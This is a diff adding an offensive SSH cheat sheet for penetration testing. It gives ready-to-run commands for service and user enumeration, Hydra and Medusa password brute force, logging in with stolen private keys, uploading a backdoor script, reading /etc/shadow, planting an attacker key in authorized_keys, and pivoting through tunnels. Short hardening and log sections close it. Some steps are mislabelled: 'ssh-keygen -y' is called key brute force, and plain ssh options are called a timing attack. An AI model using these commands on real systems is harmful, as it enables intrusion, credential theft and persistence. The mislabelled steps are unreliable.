@@ -1,0 +1,296 @@
+=========================================
+SSH (Secure Shell) – Deep Offensive Cheat Sheet
+=========================================
+
+PORT:
+22/tcp (default)
+Custom ports common (2222, 2200, 22222)
+
+RFC:
+RFC 4251–4256
+
+Transport:
+TCP
+
+-----------------------------------------
+1. BASIC ENUMERATION
+-----------------------------------------
+
+# Fast scan
+nmap -p22 <IP>
+
+# Full service detection
+nmap -p22 -sC -sV -A <IP>
+
+# SSH-specific scripts
+nmap -p22 --script ssh-* <IP>
+
+# Detect weak algorithms
+nmap -p22 --script ssh2-enum-algos <IP>
+
+-----------------------------------------
+2. BANNER & VERSION GRABBING
+-----------------------------------------
+
+# Netcat
+nc <IP> 22
+
+# Telnet
+telnet <IP> 22
+
+# SSH verbose
+ssh -vvv user@<IP>
+
+-----------------------------------------
+3. USER ENUMERATION (CRITICAL)
+-----------------------------------------
+
+# Timing attack (OpenSSH < 7.7)
+ssh -o PreferredAuthentications=none user@<IP>
+
+ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAlgorithms=+ssh-rsa user@<IP>
+
+Response difference:
+- Valid user → slower response
+- Invalid user → instant reject
+
+# Tool: ssh-user-enum
+python ssh_enum.py <IP> users.txt
+
+# Metasploit
+use auxiliary/scanner/ssh/ssh_enumusers
+
+-----------------------------------------
+4. AUTHENTICATION METHODS ENUM
+-----------------------------------------
+
+# Check allowed methods
+ssh -vvv user@<IP>
+
+Common:
+- password
+- publickey
+- keyboard-interactive
+- gssapi
+
+-----------------------------------------
+5. PASSWORD BRUTE FORCE
+-----------------------------------------
+
+# Hydra
+hydra -l user -P passwords.txt ssh://<IP>
+
+# Multiple users
+hydra -L users.txt -P passwords.txt ssh://<IP>
+
+# Medusa
+medusa -h <IP> -u user -P passwords.txt -M ssh
+
+-----------------------------------------
+6. SSH KEY ATTACKS (VERY IMPORTANT)
+-----------------------------------------
+
+# Check readable keys
+ls -la ~/.ssh/
+
+Files:
+id_rsa        → private key
+id_rsa.pub    → public key
+authorized_keys
+
+# Use stolen key
+chmod 600 id_rsa
+ssh -i id_rsa user@<IP>
+
+# Key brute force (rare but possible)
+ssh-keygen -y -f id_rsa
+
+-----------------------------------------
+7. WEAK KEY / CRYPTO ATTACKS
+-----------------------------------------
+
+# Enumerate algorithms
+nmap --script ssh2-enum-algos -p22 <IP>
+
+Weak:
+- diffie-hellman-group1-sha1
+- ssh-rsa (SHA1)
+- CBC ciphers
+
+# Tool
+ssh-audit <IP>
+
+-----------------------------------------
+8. EXPLOIT CHECKING
+-----------------------------------------
+
+searchsploit openssh
+searchsploit ssh
+
+Common vulns:
+- OpenSSH user enum
+- OpenSSH scp command injection
+- Old privilege escalation bugs
+
+-----------------------------------------
+9. SCP / SFTP ABUSE
+-----------------------------------------
+
+# SCP file download
+scp user@<IP>:/etc/passwd .
+
+# SCP upload
+scp backdoor.sh user@<IP>:/tmp/
+
+# SFTP
+sftp user@<IP>
+
+-----------------------------------------
+10. SSH TUNNELING (PIVOTING GOLD)
+-----------------------------------------
+
+# Local port forwarding
+ssh -L 8080:127.0.0.1:80 user@<IP>
+
+# Remote port forwarding
+ssh -R 4444:127.0.0.1:4444 user@<IP>
+
+# Dynamic SOCKS proxy
+ssh -D 9050 user@<IP>
+
+Used for:
+- Internal web access
+- Pivoting
+- Bypass firewall
+
+-----------------------------------------
+11. SSH AGENT ABUSE
+-----------------------------------------
+
+# Check agent
+echo $SSH_AUTH_SOCK
+
+# List loaded keys
+ssh-add -l
+
+# Abuse forwarded agent
+ssh -A user@<IP>
+
+-----------------------------------------
+12. POST-EXPLOIT ENUMERATION
+-----------------------------------------
+
+whoami
+id
+groups
+uname -a
+sudo -l
+cat /etc/passwd
+cat /etc/shadow (if readable)
+
+-----------------------------------------
+13. PRIVILEGE ESCALATION VIA SSH
+-----------------------------------------
+
+# Sudo misconfig
+sudo -l
+
+# Writable authorized_keys
+echo "attacker_pub_key" >> ~/.ssh/authorized_keys
+
+# Root login allowed
+PermitRootLogin yes
+
+-----------------------------------------
+14. CONFIG FILES TO CHECK
+-----------------------------------------
+
+/etc/ssh/sshd_config
+~/.ssh/authorized_keys
+~/.ssh/config
+
+Critical options:
+- PermitRootLogin
+- PasswordAuthentication
+- AllowUsers
+- AllowGroups
+
+-----------------------------------------
+15. COMMON MISCONFIGURATIONS
+-----------------------------------------
+
+- Root login enabled
+- Weak passwords
+- Old OpenSSH version
+- Password auth enabled
+- Agent forwarding enabled
+- No rate limiting
+- Exposed private keys
+
+-----------------------------------------
+16. LOG FILES (BLUE TEAM AWARENESS)
+-----------------------------------------
+
+/var/log/auth.log
+/var/log/secure
+/var/log/messages
+
+-----------------------------------------
+17. SSH HARDENING INDICATORS
+-----------------------------------------
+
+- Key-only auth
+- Fail2ban
+- Custom port
+- AllowUsers used
+- No root login
+- Modern crypto
+
+-----------------------------------------
+18. TOOLSET SUMMARY
+-----------------------------------------
+
+nmap
+hydra
+medusa
+metasploit
+ssh-audit
+searchsploit
+scp
+sftp
+proxychains
+netcat
+
+-----------------------------------------
+19. SSH → FULL ATTACK CHAIN
+-----------------------------------------
+
+Port scan
+↓
+Version enum
+↓
+User enum
+↓
+Password / key attack
+↓
+SSH access
+↓
+PrivEsc
+↓
+Pivot to internal network
+
+-----------------------------------------
+20. QUICK CHECKLIST
+-----------------------------------------
+
+[ ] SSH version?
+[ ] Weak crypto?
+[ ] User enum?
+[ ] Password auth?
+[ ] Keys exposed?
+[ ] Root login?
+[ ] Pivot possible?
+
+=========================================
+END OF SSH CHEAT SHEET
+=========================================
